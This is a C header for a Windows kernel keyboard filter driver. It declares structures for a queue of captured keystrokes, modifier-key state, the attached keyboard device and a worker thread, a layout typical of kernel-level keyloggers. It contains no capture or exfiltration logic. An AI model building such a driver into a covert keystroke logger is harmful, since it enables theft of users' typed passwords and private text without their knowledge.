#pragma once
#include <ntdef.h>
#include <ntifs.h>
#include <ntddk.h>
#include <intrin.h>
#include <ntddkbd.h>
#include "globals.h"

#define DRIVER_NAME_DEBUG "KeyboardFilter: "
#define printf(...) DbgPrintEx(0, 0, DRIVER_NAME_DEBUG __VA_ARGS__)

#define print_variable(var) printf("%s = %p\n", #var, var)

#define MAXIMUM_KEY_DATA 1000

struct KEY_DATA
{
	char KeyData;
	char KeyFlags;
};

struct KEY_STATE
{
	bool kSHIFT; //if the shift key is pressed 
	bool kCAPSLOCK; //if the caps lock key is pressed down
	bool kCTRL; //if the control key is pressed down
	bool kALT; //if the alt key is pressed down
};

typedef struct _DEVICE_EXTENSION
{
	PDEVICE_OBJECT pKeyboardDevice;
	PETHREAD pThreadObj;

	KSPIN_LOCK lockQueue;
	KSEMAPHORE semQueue;

	bool bThreadTerminate;

	unsigned int uNumberOfWaitingIrps;
	unsigned int uTotalNumber;

	unsigned int enqueueIndex;
	unsigned int dequeueIndex;
	KEY_DATA keysArray[MAXIMUM_KEY_DATA];

}DEVICE_EXTENSION, * PDEVICE_EXTENSION;
